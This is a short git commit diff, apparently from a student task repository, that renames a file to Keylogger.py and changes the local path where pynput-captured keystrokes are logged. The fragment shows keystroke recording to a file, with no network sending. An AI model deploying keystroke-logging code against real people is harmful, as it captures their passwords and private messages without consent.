2a7e768ca20b1ea68dce499f82f381173ea8e7d9
PraveenChigurla <165981190+PraveenChigurla@users.noreply.github.com>
2024-10-29 08:41:45 +0530

    Update and rename TASK_04.py to Keylogger.py

--- Keylogger.py
+++ Keylogger.py
@@ -2,7 +2,7 @@ from pynput.keyboard import Listener
 import  logging
 
 #Mention Destination Address To Store the key values as a file
-logging.basicConfig(filename=("D:\samosa\logg.txt"), level=logging.DEBUG ,format="%(asctime)s-------%(message)s",filemode='a+')
+logging.basicConfig(filename=("D:\abc\logs.txt"), level=logging.DEBUG ,format="%(asctime)s-------%(message)s",filemode='a+')
 
 def on_press(key):
     print(key,"pressed")
